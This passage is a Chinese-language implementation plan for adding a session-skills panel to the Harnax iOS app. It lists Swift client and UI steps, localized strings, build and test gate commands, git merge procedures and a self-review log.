`SessionSkillClient.swift`：`extension AdminClient: SessionSkillReading` —— router 与 admin 在 iOS 侧是同一个 `AdminClient`（`HarnaxDependencies.swift:152-165` 把 `contextUsage: admin`、`workspace: admin` 等都挂在同一枚实例上，`base: .router` 才是分路由的开关），照 `ContextUsageClient.swift:17-31` 与 `:36-44` 的形状写：`read` 里两次 `await client.send(...)` 各取一份——本会话的提名取 `drafts.page(status: .pending, name: nil, sessionId: sessionId, num: 1, size: 50)`（`SkillDraftCataloging.page`，见 Files 那行新增的形参），已启用取 `GET /api/router/agent/session-skills/{sessionId}`——把每条 `SkillDraftRow` 收成 `SessionSkillRules.Draft(name:, description:)`，两份一起交 Step 3 的 `SessionSkillRules.merged(drafts:enabled:)`；`enable` 走 `APIError.business(code:message:)`（`HarnaxCore/Contract/APIError.swift:25`）落成 `SessionSkillRefusal(code:)`，非业务错（传输、解码）落 `SessionSkillRefusal(code: -1)`，两者都归 `chat.skills.enableFailed`。合并规则只有 Core 里这一份实现，客户端只做传输与降形，别在两个地方各写一遍。两份读**各走各的失败**，与 webui 那条 `Promise.allSettled` 同一判据（`harnax-webui/src/pages/session/components/SessionSkillsDrawer.tsx`，并由 `sessionSkills.test.ts:100-124` 钉住「一份失败另一份成功时，成功的那一半照常渲染」）：每份各用一个 `switch` 就地吃掉自己的失败，失败那份交空清单，两份都答上来才 `unavailable = false`。所以 `read` **不抛错**，返回 `SessionSkillRead(rows:unavailable:)`——一份失败要抛错的话，已经拿到的那一半会被 VM 丢掉，第一次打开就变成「这个会话没写过技能」那句谎。两份互不依赖，用 `async let` 并发发出（今天的两次顺序 `await` 白等一个来回）。

- [ ] **Step 5: 界面与依赖**

`HarnaxDependencies.swift`：加 `public let sessionSkills: (any SessionSkillReading)?`（形参默认 `nil`，live 装配补上）。
`ChatView.swift` `.toolbar`（`:83-100`，此刻两枚 `ToolbarItem(placement: .primaryAction)`）内加第三枚，并在 `:101-114` 加 `.sheet(isPresented: $showSessionSkills) { SessionSkillsSheet(vm: …) }`——`showSessionSkills` 是本 View 的 `@State`，不进 `ChatViewModel`；`.task(id: conversation)`（`:115-126`）也不取这份数，面板的数据只在面板打开时取。
`SessionSkillsViewModel.swift`：`@Observable`（或本仓 Chat 目录里 ViewModel 的既有宏，逐字照同目录那几份）持 `rows: [SessionSkillRow]`、`isLoading`、`unavailable`、`notice: SessionSkillRefusal?`（Step 3 已有此型，它自带 `messageKey`，别再造一个），方法 `refresh()` 与 `enable(name:)`。`refresh()` 照 `ChatViewModel.refreshContextUsage()`（`:1471-1485`）的 generation 竞争保护形状：只把最新一次取数的答案留下。`reading` 为 `nil`（依赖未装配）只置 `unavailable = true`、`rows` 不动；否则把 `read` 返回的两项原样落下——一份读失败时 `rows` 就是答上来那一半，同时 `unavailable = true`，两者并存而不是互相抹掉；`enable` 的 `SessionSkillRefusal` 置 `notice`。
`SessionSkillsSheet.swift`：一行一名 + `Button(hx("chat.skills.enable"))`，已启用的行显示 `chat.skills.enabled` 状态而不是再一枚按钮；`notice` 非空时用 `hx(notice.messageKey)` 落在行下方（本仓 Chat 目录没有 toast，拒因走 `SkillDraftDetailViewModel.swift:35,86,133` 那种 `notice` 状态形状）；`unavailable` 且 `rows` 为空才出 `chat.skills.loadFailed` 空态，`rows` 非空时清单照常列、`unavailable` 另挂一句横幅（与重读失败保住旧行那支同形状），`chat.skills.empty` 只在两份读都成功而合并结果为空时才出现。
文案两份（zh 在 `skill.draft.*` 之前、en 同位）：

```
"chat.skills.entry" = "本会话技能" / "Session skills"
"chat.skills.title" = "本会话自写技能" / "Skills written in this session"
"chat.skills.enable" = "在本会话启用" / "Enable in this session"
"chat.skills.enabled" = "已在本会话启用" / "Enabled in this session"
"chat.skills.empty" = "这个会话还没有自写的技能" / "This session has not written a skill yet"
"chat.skills.loadFailed" = "这个会话的技能读不出来" / "Could not load this session's skills"
"chat.skills.blocked" = "安全扫描判定为危险，不能启用" / "The security scan says dangerous, so it cannot be enabled"
"chat.skills.full" = "这个会话已启用十条技能" / "This session already has ten skills enabled"
"chat.skills.noSandbox" = "这个会话的沙箱没有在运行" / "This session's sandbox is not running"
"chat.skills.sourceGone" = "这份草稿已经不在了" / "That draft is gone"
"chat.skills.copyFailed" = "沙箱没有接受这次复制" / "The sandbox refused the copy"
"chat.skills.enableFailed" = "启用没有成功" / "Could not enable it"
```

`App/HarnaxDebugScreens.swift` 加一个 `-FIXTURE session-skills` case。

- [ ] **Step 6: 跑闸门**

Run: `cd harnax-ios && swift test --scratch-path /tmp/hx-ios-b`
Expected: 全绿，0 失败。本分支上的 iOS 基线**不是** 1884——那是别的分支上的数；`git show HEAD:harnax-ios` 单独声明 2064 个测试方法，进场实测约 2059，本任务加 27 例，收尾数按 **2086** 记，验收口径是「+27 例、0 回归」。

App target 不能用 `xcrun -sdk macosx swiftc -typecheck` 来证：`App/` 不是 SwiftPM target（`swift test` 根本碰不到它），而 `HarnaxDebugScreens.swift` 整份文件都在 `#if DEBUG` 里，不带 `-D DEBUG` 的类型检查是在编一个空文件，绿了也不说明任何事。真的闸门是打模拟器包：

```bash
xcodebuild -project Harnax.xcodeproj -scheme Harnax -configuration Debug -sdk iphonesimulator \
  -arch arm64 CODE_SIGNING_ALLOWED=NO -derivedDataPath DerivedData build > /tmp/hx-app.log 2>&1
echo "EXIT=$?" >> /tmp/hx-app.log
```

`-derivedDataPath` 必须配 `-scheme`（配 `-target` 会被 xcodebuild 直接拒）。判据两条：日志末尾 `** BUILD SUCCEEDED **`、且出现 `SwiftCompile normal arm64 Compiling HarnaxDebugScreens.swift`——只有前者而没有后者，说明这个文件没被编。`DerivedData/` 已在 `harnax-ios/.gitignore` 里。

- [ ] **Step 7: 提交**

```bash
git add harnax-ios/Sources/HarnaxCore/Contract/SessionSkill.swift \
        harnax-ios/Sources/HarnaxAPI/SessionSkillEndpoint.swift \
        harnax-ios/Sources/HarnaxAPI/SessionSkillClient.swift \
        harnax-ios/Sources/HarnaxFeatures/Chat/SessionSkillsViewModel.swift \
        harnax-ios/Sources/HarnaxFeatures/Chat/SessionSkillsSheet.swift \
        harnax-ios/Sources/HarnaxFeatures/Chat/ChatView.swift \
        harnax-ios/Sources/HarnaxCore/Contract/SkillDraftCataloging.swift \
        harnax-ios/Sources/HarnaxAPI/SkillDraftClient.swift \
        harnax-ios/Sources/HarnaxAPI/SkillDraftEndpoint.swift \
        harnax-ios/Sources/HarnaxFeatures/Support/HarnaxDependencies.swift \
        harnax-ios/Sources/HarnaxKit/Resources/zh-Hans.lproj/Localizable.strings \
        harnax-ios/Sources/HarnaxKit/Resources/en.lproj/Localizable.strings \
        harnax-ios/App/HarnaxDebugScreens.swift \
        harnax-ios/Tests/HarnaxCoreTests/SessionSkillTests.swift
git commit -m "feat(ios): 会话页自写技能面板与启用动作——四类拒因各有自己的说法"
```

---

## Task 13: 文档同步与合回 kotlin-dev

**Files:**
- Modify: `docs/superpowers/specs/2026-10-08-session-skill-lifecycle-design.md`（只在实现偏离时回写，不写历史对照）
- Modify: `harnax-ios/FEATURES.md`、`harnax-ios/FUNCTIONS.md`、`harnax-ios/specs/02-session-chat.md`、`harnax-ios/specs/07-skill-draft-review.md`
- Modify: `prod_doc/self-improving*.md`（中英两份，若存在成对件）

- [ ] **Step 1: 现状文档写当前状态**

iOS `FEATURES.md` 会话域加一行「本会话自写技能（启用/拒因）」；`FUNCTIONS.md` 加一节写清三步：模型写 `_drafts` → 答完自动进待审队列 → 会话页确认后 `session-enabled/` 里那份在下一轮进系统提示。口径与 webui 的「技能自我进化」保持一致。

- [ ] **Step 2: 全量门禁重跑**

```
... mvn -o test -pl harnax-agent/harnax-harness-core,harnax-agent/harnax-agent-service,harnax-session-router,harnax-admin -am
cd harnax-webui && npm run build
cd harnax-ios && swift test --scratch-path /tmp/hx-ios-final
```

Expected: 全部 `BUILD SUCCESS`，0 失败。计数按这条链对，每一档都以已提交那轮的实跑数为准，别用「≥」糊过去：

- harness-core **691**：进场 662 → Task 1/2/3 各抬一笔得 678 → Task 4 补强 682 → Task 5 685 → Task 6 687 → Task 7（`claim` 窗口两支）689 → 控制方自己那笔 attachIfRunning 句柄 provider 修复（`KeepAliveSandboxManagerTest` 追加的 `AttachIfRunning` 两支）691。Skipped 恒为 1。
- harnax-admin **2432**：进场 2430 → Task 10 追加的两支单元用例（会话过滤 + 三个空谓词）抬到 2432。IT 的那支会话过滤只在 `-Pintegration-test` 下跑，不计入这个数。
- harnax-ios **按本分支实测**：进场约 2059（1884 是别的分支的数），Task 12 的会话技能套件加 27 例；Task 12 复审把两份读改成各走各的失败后按它报告的实数写。
- webui 的 jest 与逐文件 biome 各跑一遍，`npx max build` 退 0。

- [ ] **Step 3: 合回 kotlin-dev（不 push）**

先算重写集与未提交集（主检出另有轨道在改 iOS 文件，脏状态本身就是闸）：

```bash
git -C /Users/heqingsong/code/my_project/harnax status --short
git log --oneline kotlin-dev..feat/session-skill-lifecycle
```

只有主检出的 `harnax-ios/**` 未提交集与本分支改动不重叠时才 `git checkout kotlin-dev && git merge --no-ff feat/session-skill-lifecycle`；重叠则先停下来问一句，不要替他 stash。合完 HEAD 级复验：`git log --oneline -3`、`git diff --stat HEAD~1 HEAD`，并在新 HEAD 上重跑 harness-core 门禁（工作树绿 ≠ HEAD 绿）。

- [ ] **Step 4: 真栈验收（需要用户在部署环境上点）**

部署 `bash harnax-deploy/deploy-service.sh` 相关服务（后端三件 + frontend），然后在「测试会话2」里：让 agent 写一条 demo skill → 队列出现行 → 会话页出现可点行 → 点启用 → 下一轮问它「用 invoice-fill 做一遍」看模型是否真用上了。清库与存量各跑一遍。

---

## Self-Review 记录

- 规格覆盖：D2/D3 → Task 1+5+6；D4/D5 + §4 → Task 3+4+8（Task 4 的 `the copy never reaches into the draft directory it reads from` 落的就是 D4「复制不动 `_drafts`」这一条）；D6/§5 → Task 7；§7 Admin 过滤 → Task 10（含 `SkillDraftFlowIT` 追加的会话过滤 IT）；§7 代理链 → Task 9；§8 界面 → Task 11+12；§10 验证 → 各任务 Step 1/2 + Task 13 Step 2/4。D7/D8/D10/D11/D12 是「不做」类裁定，无对应代码任务。
- **§10 有一条按字面做不到**：「IT（harness-core）：……交付同名技能压住」。上游这两枚方法都是 `private`——`HarnessSkillMiddleware.skillsForCall`（`asrc-1008/io/agentscope/harness/agent/middleware/HarnessSkillMiddleware.java:321`）与 `mergeRepositories`（同文件 `:349`），本仓拿不到合并后的那张表，harness-core 现无任何 IT（`src/test/kotlin` 下 `*IT.kt` 为 0 支）。这一条拆成三处 discharge：名次本身由 Task 6 的 `skillRepositories` 顺序断言守住，会话区内容能否被读到由 Task 5 的 `getAllSkills` 守住，「交付那份压住会话那份」的真实合并只在 Task 13 Step 4 的真栈验收里观测。别为了这条去反射调用私有方法。
- 测试框架核对过：`harnax-ios/Tests` 下 142 处 `import XCTest`、0 处 Swift Testing，所以 Task 12 用 `XCTestCase` + `XCTAssertEqual`；`harnax-webui` 用 jest 且有同目录 `*.test.ts` 先例（`src/pages/session/components/contextUsage.test.ts`），Task 11 沿用。`SkillDraftRow` 的成员式初始化器是 internal 且要填满 13 个存储属性，Task 12 的 Core 判据因此改吃 `SessionSkillRules.Draft`，不在测试里解码夹具。
- 拒因码前后端对齐：后端 `EnableOutcome` 六支（Task 3）→ agent-service 信封码 403/409/404/410/500（Task 8；`ResultVo.error(code, message)` 只写信封 `code`、HTTP 恒 200，见 `harnax-common/src/main/kotlin/com/agnetix/harnax/common/dto/ResultVo.kt:55`，所以这枚码能原样穿过 Task 9 的代理）→ webui `refusalOf(code).id`（Task 11）与 iOS `SessionSkillRefusal.messageKey`（Task 12）各覆盖同一组码，未知码一律落通用文案，不许谎报「草稿不在了」。
- 占位符已清零：Task 9 Step 1 的 `fixture()` 原先留了一个 `TODO` 等实现方补，3cbc07da 已换成能真跑的 `SessionRouterService` 十参构造夹具；Task 10 的两支用例原本要新建 `SkillDraftServiceImplPageTest.kt` 并重抄 771 行夹具，同一笔改动改成挂在既有 `SkillDraftServiceImplTest.kt` 的 `page is tenant scoped` 之后、复用它的 `storedDraft`/`skillDraftMapper` 桩。核对方式：全篇扫 `TODO`/`TBD`/`待补`，并扫一遍 Files 段里所有 `Create:` 看是不是真有同名新文件需要建。
- 类型一致性：`EnableOutcome`（Task 3 定义、Task 4 补行为、Task 8 消费）、`SessionDraft`/`EnabledSkill`（Task 3 定义、Task 7/8 消费）、`SESSION_SKILL_SOURCE`（Task 5 定义、Task 6 断言）、`findingTexts`（Task 3 定义、Task 7 消费）四处名字一致；webui `sessionSkillsFor` 与 iOS `SessionSkillRules.merged` 是同一条合并规则的两端实现，字段名 `name/description/enabled/enabledAt` 对齐；mapper 与 XML 的真实位置在 `harnax-entity`（Task 10 已按全路径写）。
